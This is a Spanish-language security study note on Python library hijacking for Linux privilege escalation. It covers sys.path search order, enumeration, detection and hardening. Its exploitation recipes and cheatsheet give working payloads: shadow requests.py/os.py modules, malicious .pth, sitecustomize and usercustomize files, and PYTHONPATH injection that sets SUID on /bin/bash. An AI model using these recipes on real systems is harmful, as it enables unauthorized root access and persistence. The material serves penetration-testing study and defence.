---
aliases:
  - Secuestro de Librerías Python
  - Python Library Hijacking
  - Python Path Hijacking
tags:
  - sec/priv-esc
  - sec/linux
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Python - Módulos, Paquetes y Distribución]]"
  - "[[Detección y Explotación de Tareas Cron]]"
  - "[[PATH Hijacking]]"
  - "[[Secuestro de Bibliotecas Compartidas]]"
  - "[[Explotación de Servicios Internos]]"
  - "[[Privilegios SUID en Linux]]"
fuente: "https://docs.python.org/3/library/sys.html#sys.path"
---

# Python Library Hijacking

**Python Library Hijacking** es la inyección de código aprovechando que el *import system* de Python **busca módulos recorriendo `sys.path` en orden** y se queda con el **primer acierto**. Si un atacante coloca (o edita) un módulo en una ruta buscada **antes** que la versión legítima — o en un directorio que se *ejecuta* al arrancar intérpretes —, su código corre con los privilegios de quien lanza el script: cron de root, servicio systemd, app web con el usuario del daemon.

> [!info] Prioridad de carga de módulos (corregida)
> El orden real de búsqueda en `import` **no** empieza por "el directorio actual" a secas ni termina en `site-packages`:
> 1. **Módulos builtin/frozen** (`sys.builtin_module_names` — `sys`, `marshal`, `posix`…): no se buscan en disco, **no son secuestrables**.
> 2. **`sys.path[0]`**: el directorio del **script que se ejecuta** (`python /opt/app.py` → `/opt/`); con `python -c` o REPL es el **cwd** (`''`).
> 3. **`PYTHONPATH`** (si no se ignora con `-E`).
> 4. **Estándar**: `lib/pythonX.Y.zip`, `lib/pythonX.Y/`, `lib-dynload/` (definidas por `PYTHONHOME` o el prefijo de instalación).
> 5. **`site-packages` del sistema** (`/usr/lib/python3/dist-packages`, `…/site-packages`).
> 6. **User site** (`~/.local/lib/pythonX.Y/site-packages`) — salvo `-s`/`-I`.
> Además, al arrancar Python ejecuta **`sitecustomize.py`** y **`usercustomize.py`**, y procesa **`*.pth`** (cualquier línea que empiece por `import ` se **ejecuta**). Esos tres ganchos son vectores de ejecución *sin importar* el orden de arriba.

## Mecánica: qué ocurre en un `import`

```text
import requests
  → sys.modules?  sí → caché, no busca nada
  → sys.meta_path: BuiltinImporter / FrozenImporter / PathFinder
  → PathFinder recorre sys.path de izquierda a derecha:
       entry/requests/__init__.py  o  entry/requests.py  → PRIMERO QUE GANA
  → (si no hay match) ModuleNotFoundError
```

Tabla de vectores según la posición en `sys.path`:

| Posición | Ruta | Vector del atacante | ¿Puede sombrear stdlib? |
|---|---|---|---|
| 1 | dir del script (`sys.path[0]`) | dir **escribible** junto al script | **Sí** — gana a todo |
| 2 | `PYTHONPATH` | variable en el entorno del proceso víctima | **Sí** |
| 3 | stdlib | escritura en `/usr/lib/python3.X` (≈ root ya) | — |
| 4 | `site-packages` del sistema | paquete nuevo o **edición** de paquete existente | No (stdlib va antes), **sí** sombra paquetes 3.º |
| 5 | user site | escribir en `~/.local/...` del usuario víctima | No (va el último) |
| — | ganchos de `site` | `sitecustomize.py`, `usercustomize.py`, `*.pth` | ejecución directa al arrancar |

> [!warning] Script dir ≠ cwd
> `python3 /opt/app/main.py` mete **`/opt/app/`** en `sys.path[0]`, no el directorio desde el que llamaste. Probar desde tu terminal con `python -c "import sys; print(sys.path[0])"` (cwd) y concluir que "cron usará mi cwd" es un **falso negativo**: cron ejecuta `python3 /ruta/main.py` → la ruta relevante es `/ruta/`. Verificar siempre con la forma exacta de invocación del proceso víctima.

## Enumeración: qué mirar

```bash
# 1) sys.path del intérprete EXACTO que usa el proceso víctima
/usr/bin/python3 -c "import sys, pprint; pprint.pprint(sys.path)"
sudo -u www-data /usr/bin/python3 -c "import sys; print(sys.path)"   # según su usuario

# 2) ¿Alguna entrada es escribible (por ti o por el usuario del servicio)?
/usr/bin/python3 - <<'EOF'
import sys, os
for p in filter(None, sys.path):
    if os.access(p, os.W_OK):
        print("WRITABLE:", p)
EOF

# 3) Ganchos y .pth instalados
find /usr/lib/python3* /usr/local/lib/python3* ~/.local/lib/python3* \
     -name 'sitecustomize.py' -o -name 'usercustomize.py' -o -name '*.pth' 2>/dev/null
grep -RIn '^import' --include='*.pth' /usr/lib/python3*/site-packages /usr/local/lib/python3*/dist-packages 2>/dev/null

# 4) Entorno que le llega al proceso
tr '\0' '\n' < /proc/<pid>/environ | grep -E '^PYTHON'
systemctl show <svc> -p Environment,EnvironmentFile,ExecStart

# 5) Directorios clave y sus permisos
ls -ld /usr/lib/python3*/ /usr/lib/python3*/dist-packages /usr/local/lib/python3*/dist-packages
ls -la /opt/app/ 2>/dev/null          # dir del script de root: ¿escribible?
```

### Triage

| Hallazgo | Nivel |
|---|---|
| `sys.path[0]` (dir del script de un job root) escribible | **P1 — root** |
| `site-packages` del sistema escribible | **P1** (edición de paquete = ejecución en cada arranque) |
| `PYTHONPATH` con ruta escribible en entorno de servicio root | **P1** |
| Entrada `import os…` en un `.pth` de sistema | **P1** (se ejecuta en *todo* intérprete) |
| User site de root escribable (`/root/.local/lib/...`) | **P1** |
| `sitecustomize.py` inexistente en sistema | normal (no es vector por sí solo) |

## Explotación: recetas

### 1) Sombreado de módulo en el dir del script (la receta base)

Cron de root: `*/5 * * * * python3 /opt/scripts/backup.py` y `/opt/scripts` es escribible:

```bash
# backup.py importa `requests` o `os`; coloca TU versión primero en el path
cat > /opt/scripts/requests.py <<'EOF'
import subprocess, os
def get(*a, **k):        # firma mínima para no romper el llamado
    pass
os.setuid(0); os.system("chmod u+s /bin/bash")
EOF
# El próximo arranque de backup.py ejecuta TU requests.py con euid=0
```

**Truco `os.py` (sombreado de stdlib puro)**: `os` es un `.py` de la stdlib y se importa tarde en el arranque de casi cualquier script. Un `os.py` en `sys.path[0]` **reemplaza al stdlib**:

```python
# /opt/scripts/os.py  (dir escribible del script de root)
import os as _path_guard, sys
# 1) payload al importar:
open("/tmp/pwned", "w").write("pwned by os.py shadow")
# 2) re-exportar el os real desde su ruta absoluta (evita bucle y no rompe al script):
import importlib.util as _u
_s = _u.spec_from_file_location("os_real", "/usr/lib/python3.11/os.py")
_m = _u.module_from_spec(_s); _s.loader.exec_module(_m)
globals().update({k: getattr(_m, k) for k in dir(_m) if not k.startswith("__")})
```

> [!tip] Variante práctica y menos frágil
> Sombras de stdlib complejos (`os.py`) suelen romper el script. La variante más limpia es sombrear el **tercer paquete** que el script importa (`requests.py`, `paramiko.py`, `yaml.py`…) con una firma mínima + payload, o directamente **editar** el paquete existente en `site-packages` si es escribible.

### 2) `PYTHONPATH` en el entorno del proceso víctima

```bash
# systemd: EnvironmentFile escribible
echo 'PYTHONPATH=/tmp/evil' >> /etc/default/miservicio && systemctl restart miservicio
# /tmp/evil/requests.py → payload

# crontab de root:
#  PYTHONPATH=/tmp/evil  (variable en la entrada) o en el Environment= de la unit
# /etc/environment (pam_env) afecta a todos los logins si es escribible
```

### 3) `.pth` — ejecución en todo intérprete

```bash
# Cualquier línea que empieza por "import " se EJECUTA al arrancar python
cat > /usr/local/lib/python3.11/dist-packages/pwn.pth <<'EOF'
import os; os.system("chmod u+s /bin/bash")
EOF
# Cualquier usuario (o root) que ejecute python3 → payload. Requiere escritura en site-packages.
```

### 4) `sitecustomize.py` / `usercustomize.py`

```bash
# sitecustomize se ejecuta en TODOS los intérpretes con el site habilitado:
echo 'import os; os.system("id > /tmp/pwned")' > /usr/lib/python3/dist-packages/sitecustomize.py
# usercustomize solo para el home del usuario (root incluido):
mkdir -p /root/.local/lib/python3.11/site-packages
echo 'import os; os.system("chmod u+s /bin/bash")' \
  > /root/.local/lib/python3.11/site-packages/usercustomize.py
```

### 5) `site-packages` escribible → editar paquete real

```bash
# Si /usr/local/lib/python3.x/dist-packages es group-writable o 777:
cat > /usr/local/lib/python3.x/dist-packages/celery/__init__.py   # paquete que usa el servicio
# …payload + el código original, o:
echo 'import os; os.system("…")' >> /usr/local/lib/python3.x/dist-packages/<paquete>/__init__.py
# efecto: cada worker/cron/servicio que importe ese paquete ejecuta el payload
```

### 6) Virtualenv comprometido

Un venv en dir escribible (`bin/python` es symlink + `pyvenv.cfg`): sustituir `bin/python` por un wrapper, o meter `usercustomize`/`.pth` en `venv/lib/python3.X/site-packages/`. Si el servicio root activa ese venv en su `ExecStart=/opt/venv/bin/python app.py` → root.

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| Escritura en directorios de `sys.path` | `auditctl -w /usr/lib/python3/dist-packages -p wa -k py_site_write`; ídem `/usr/local/lib/python3*/dist-packages` |
| `.pth`/`sitecustomize` nuevos | FIM sobre `find / -name '*.pth' -o -name sitecustomize.py -o -name usercustomize.py`; diff de inventario |
| `PYTHONPATH` no estándar en servicios | `systemctl show -p Environment` en baseline; alerta si contiene rutas de usuario/`/tmp` |
| Script de root en dir escribible | revisión: `ls -ld $(dirname $(systemctl show -p ExecStart …))` / dueño de los `.py` de cron |
| Módulos que no coinciden con el paquete | `pip freeze` + hashes (`pip install --require-hashes`), `pip check`; diff vs baseline |
| Ejecución sospechosa al arrancar python | strace/ltrace del servicio: `openat(..., "requests.py")` resolviendo a rutas no estándar |

Artefactos: `requests.py`/`os.py` sueltos junto al script, `__pycache__` con `.pyc` sin `.py` correspondiente (`find … -name '*.pyc' ! -name '*.py'`), `pwn.pth`, `PYTHONPATH` en `/proc/<pid>/environ`.

## Impacto

- **Root o usuario del servicio**: cualquier payload al importar corre con el EUID del que lanzó Python — cron de root = root; gunicorn como `www-data` = lateral a la web.
- **Robo de secretos**: el payload lee `os.environ`, credenciales de app, tokens.
- **Persistencia**: `sitecustomize`/`.pth` sobreviven a borrados del script original y afectan a **todos** los intérpretes.
- **Supply chain lateral**: un `site-packages` escribible por el atacante permite trojanear librerías que otros usuarios/ servicios importarán (ver [[Python - Módulos, Paquetes y Distribución]] para el modelo de instalación).

## Sección defensiva: endurecimiento

```bash
# 1) Aislar el intérprete de scripts privilegiados
python3 -I /opt/app/main.py     # -I: ignora PYTHON* (-E), site de usuario (-s) y no añade
                                #     el dir del script (versiones modernas) — el modo "scripts serios"
#  variantes: -E (ignora variables PYTHON*), -s (sin user site), -P (sin script dir/cwd; py≥3.11)

# 2) Permisos: sys.path de root debe ser inmutable para el resto
chmod 755 /usr/lib/python3 /usr/lib/python3/dist-packages
chown -R root:root /usr/local/lib/python3*/dist-packages
find /usr/local/lib/python3* -perm -0002 -o -group-writable   # nada escribible

# 3) Los scripts de root viven en dirs de root
chown root:root /opt/scripts && chmod 755 /opt/scripts
#  nunca: root ejecutando python desde /home/user o /tmp

# 4) Entorno limpio en units
[Service]
Environment=            # limpiar herencia
#  no usar EnvironmentFile en dirs escribibles; revisar PYTHONPATH heredado

# 5) Instalación con hashes (bloquea tampering/tiposquatting)
pip install --require-hashes -r requirements.txt
#  venvs de servicios: creados y owned por root, no en /tmp

# 6) Ganchos auditados
find / -name 'sitecustomize.py' -o -name 'usercustomize.py' -o -name '*.pth' 2>/dev/null
#  fuera de inventario → investigar

# 7) Detección
auditctl -w /usr/lib/python3/dist-packages -p wa -k py_site_write
auditctl -w /usr/local/lib/python3/dist-packages -p wa -k py_site_write
```

## Errores comunes

1. **Confundir cwd con `sys.path[0]`** — con `python script.py` entra el **dir del script**; el cwd solo aparece con `-c`, REPL o (según versión/flags) sin script. Verlo con `python3 -c "import sys; print(sys.path)"` *y* `python3 /ruta/script.py` legible.
2. **Intentar sombrear módulos builtin** — `sys.py`, `marshal.py` no existen en disco: `sys.builtin_module_names` gana siempre. (`os`, `json`, `requests` sí son sombreables.)
3. **Sombrear stdlib desde `site-packages`** — va *después* que la stdlib: `os.py` allí nunca se usa. El vector allí es **editar paquetes existentes** o `.pth`.
4. **Meter el payload tarde** — `sys.modules` cachea: si el módulo ya fue importado al llegar tu código, el sombreado no hace nada. Debe existir **antes** del primer import (proceso fresco: cron, restart).
5. **Probar con tu python de venv** y concluir que el sistema es vulnerable: auditar **el intérprete exacto** del proceso víctima (`/proc/<pid>/exe`).
6. **Olvidar que `-s`/`-I` desactivan user site** — `usercustomize.py` no se carga con `python3 -I`; un ataque probado en interactivo no aplica al servicio aislado (o viceversa).
7. **Falso positivo: directorio escribible "en algún sys.path"** — debe ser escribible **por el usuario del proceso víctima** (tu escritura no sirve si root corre el script y el dir es 775 `staff` sin ti).
8. **Romper el servicio al sombrear** — payloads que fallan al importar dejan el servicio caído (ruido + pérdida del vector). Firmas mínimas o append al módulo real.
9. **Ignorar `.pyc`/`__pycache__`** — al editar `.py`, borra el `__pycache__` correspondiente o el bytecode viejo puede confundir el análisis forense (`find -name __pycache__`).

## Cheatsheet

```bash
# Enumeración
/usr/bin/python3 -c "import sys; print(sys.path)"
sudo -u <svcuser> <python> -c "import sys; print(sys.path)"   # según víctima
for p in $(<python> -c "import sys;print(':'.join(sys.path))"); do test -w "$p" && echo WRITABLE $p; done
find / -name '*.pth' -o -name sitecustomize.py -o -name usercustomize.py 2>/dev/null
tr '\0' '\n' < /proc/<pid>/environ | grep PYTHON

# Ataque (lab): sombreado en dir del script
cat > /opt/scripts/requests.py <<'EOF'
import os
def get(*a, **k): pass
os.system("chmod u+s /bin/bash")
EOF
# .pth:  echo 'import os; os.system("…")' > <site-packages>/pwn.pth
# env:   PYTHONPATH=/tmp/evil (en unit/crontab de root)

# Defensa
python3 -I script.py            # aislado: -E -s (+ no script dir)
chmod 755 /usr/local/lib/python3*/dist-packages
pip install --require-hashes -r requirements.txt
auditctl -w /usr/lib/python3/dist-packages -p wa -k py_site_write
```

## Referencias

- Python docs — `sys.path` y módulos: https://docs.python.org/3/library/sys.html#sys.path
- Python docs — `site` (ganchos `sitecustomize`/`usercustomize`, `.pth`): https://docs.python.org/3/library/site.html
- Python docs — opciones de línea `-I/-E/-s/-P`: https://docs.python.org/3/using/cmdline.html
- HackTricks — Python library hijacking: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation.html
- Notas internas: [[Python - Módulos, Paquetes y Distribución]], [[Detección y Explotación de Tareas Cron]], [[PATH Hijacking]]

## Relacionadas

- [[Python - Módulos, Paquetes y Distribución]] — cómo se construye `sys.path`, `site-packages` y los paquetes
- [[PATH Hijacking]] — el análogo para binarios: primer acierto en la búsqueda gana
- [[Secuestro de Bibliotecas Compartidas]] — la misma idea en el cargador dinámico (`ld.so`)
- [[Detección y Explotación de Tareas Cron]] — el escenario más frecuente: `python3 /ruta/script.py` de root
- [[Explotación de Servicios Internos]] — servicios con `PYTHONPATH`/venv configurables
- [[Privilegios SUID en Linux]] — intérpretes con SUID como alternativa directa
